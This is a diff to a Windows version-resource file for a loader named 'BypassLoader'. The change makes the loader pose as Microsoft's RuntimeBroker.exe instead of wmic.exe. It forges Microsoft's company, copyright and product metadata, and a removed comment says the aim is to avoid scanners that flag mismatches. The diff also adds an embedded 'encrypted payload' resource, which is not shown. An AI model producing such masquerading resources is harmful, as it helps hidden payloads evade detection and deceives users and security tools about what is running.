@@ -1,9 +1,8 @@
-// version.rc -- version resource for the deploy loader (BypassLoader / wmic.exe).
-// OriginalFilename must match the on-disk filename to avoid PE metadata mismatch
-// that screenshare scanners flag.
-// Adjust FileVersion / ProductVersion strings per build.
+// version.rc -- version resource for the deploy loader (BypassLoader / RuntimeBroker.exe).
+// OriginalFilename matches the on-disk filename to prevent PE metadata mismatches.
 
 #include <winver.h>
+#include "resource_ids.h"
 
 VS_VERSION_INFO VERSIONINFO
 FILEVERSION    10,0,22621,1
@@ -19,11 +18,11 @@ BEGIN
         BLOCK "040904B0"
         BEGIN
             VALUE "CompanyName",      "Microsoft Corporation"
-            VALUE "FileDescription",  "WMI command-line interface"
+            VALUE "FileDescription",  "Runtime Broker"
             VALUE "FileVersion",      "10.0.22621.1 (WinBuild.160101.0800)"
-            VALUE "InternalName",     "wmic.exe"
+            VALUE "InternalName",     "RuntimeBroker.exe"
             VALUE "LegalCopyright",   "\251 Microsoft Corporation. All rights reserved."
-            VALUE "OriginalFilename", "wmic.exe"
+            VALUE "OriginalFilename", "RuntimeBroker.exe"
             VALUE "ProductName",      "Microsoft\256 Windows\256 Operating System"
             VALUE "ProductVersion",   "10.0.22621.1"
         END
@@ -33,3 +32,6 @@ BEGIN
         VALUE "Translation", 0x0409, 0x04B0
     END
 END
+
+// Embedded encrypted payload resource
+IDR_PAYLOAD_BIN RCDATA "payload_data.bin"
